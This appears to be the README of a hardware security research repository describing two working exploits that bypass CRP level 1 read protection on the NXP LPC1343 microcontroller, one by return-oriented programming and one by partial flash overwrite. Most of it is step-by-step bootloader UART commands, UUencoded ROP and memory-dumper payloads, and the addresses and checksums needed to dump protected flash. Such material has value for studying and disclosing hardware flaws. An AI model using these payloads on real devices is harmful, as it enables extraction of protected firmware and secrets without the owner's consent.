# NXP LPC1343 CRP bypasses
This exploit bypasses CRP level 1 of the LPC1343 through Return-Oriented Programming and partial overwrite. We conduct the attack on the following development board: [LPC1343](https://www.digikey.com/catalog/en/partgroup/lpc1343-evaluation-board-lpc-p1343/33786). The serial communication for both attack scripts is based on [lpc-serial](https://github.com/zackpi/lpc-serial).

## ROP Exploit
The ```rop/``` directory contains the necessary files for this exploit. We assume the LPC is configured with CRP 1. Invoke the [rop](ROP/rop.py) script for the exploit.

 * Make sure the LPC1343 is in the bootloader: close the BLD_E jumper and ground P0_3
 * Connect via UART and send `?`
 * From now all commands should end with `\r\n`
 * You should get back `Synchronized\r\n`
 * Send `Synchronized\r\n`
 * You should get back `OK\r\n`
 * Send `12000\r\n` to the board to set the clock rate to 12MHz. You should get back `OK\r\n`
 * Let's try to read some memory, e.g. `R 0 4\r\n` - this will try to read 4 byte from 0x00, but will fail with error code `19` (CRP enabled) if chip is protected
 * Let's exploit, first send: `W 268443476 172\r\n`
 * Now, send this exploit to read from 0x000002fc (this is where CRP is stored): 
 ```
 L^PS_'____________`(``+L0_Q^[$/\?NQ#_'[L0_Q]_$?\?`````($._Q\`
 ```
 * This will give UUencoded memory block, you can repeatedly send `OK\r\n` to dump more memory
 
To change the read address, you need to adapt the address at offset 0x0C ... 0x0F (LSByte first)  in `Exploit_Read_CRP_Value.bin`. Then, `uuencode` this file, and copy only the actual encoded part. Do not include the header
```
begin 777 /dev/stdout
```
and the footer 
```
`
end
```

## Partial Overwrite Exploit
The scripts and code for this exploit are available in the ```partial_overwrite``` directory. The steps below outline the attack. This assumes that you have multiple devices with the same code (for example with ```Exploitable_UserCode.bin```). Invoke the [partial_overwite](partial_overwrite/partial_overwrite.py) script for the exploit. The below is an example to overwrite sector 1, and dump sector 0 and 2...7:

Enable Erase Command: U 23130

 * Make sure the LPC1343 is in the bootloader: close the BLD_E jumper and ground P0_3
 * Connect via UART and send `?`
 * From now all commands should end with `\r\n`
 * You should get back `Synchronized\r\n`
 * Send `Synchronized\r\n`
 * You should get back `OK\r\n`
 * Send `12000\r\n` to the board to set the clock rate to 12MHz. You should get back `OK\r\n`
 * Prepare Sector 1: `P 1 1\r\n`
 * Erase Sector 1: `E 1 1\r\n`
 * Write 256 bytes at 0x10001700 in RAM: `W 268441344 256\r\n`
 * Send the encoded dumper (see Dumper.c):
 ```
M"TL`(EEIB`;\U1+X`1NR]8!?&6#VT4_T`%)9:8D&_-42^`$;LO4`3QE@]M'I
MYP"_`(``0`"_`+\`OP"_`+\`OP"_`+\`OP"_`+\`OP"_`+\`OP"_`+\`OP"_
M`+\`OP"_`+\`OP"_`+\`OP"_`+\`OP"_`+\`OP"_`+\`OP"_`+\`OP"_`+\`
MOP"_`+\`OP"_`+\`OP"_`+\`OP"_`+\`OP"_`+\`OP"_`+\`OP"_`+\`OP"_
M`+\`OP"_`+\`OP"_`+\`OP"_`+\`OP"_`+\`OP"_`+\`OP"_`+\`OP"_`+\`
?OP"_`+\`OP"_`+\`OP"_`+\`OP"_`+\`OP"_`+\`OP``
```
* Send the checksum of the bytes: `25345\r\n`

* Prepare Sector 1: `P 1 1\r\n`

* Copy 256 bytes strating from address 0x10001700 in RAM to 0x1100 in flash: `C 4352 268441344 256\r\n`

* Reset - will now dump sector 0 and sectors 2...7


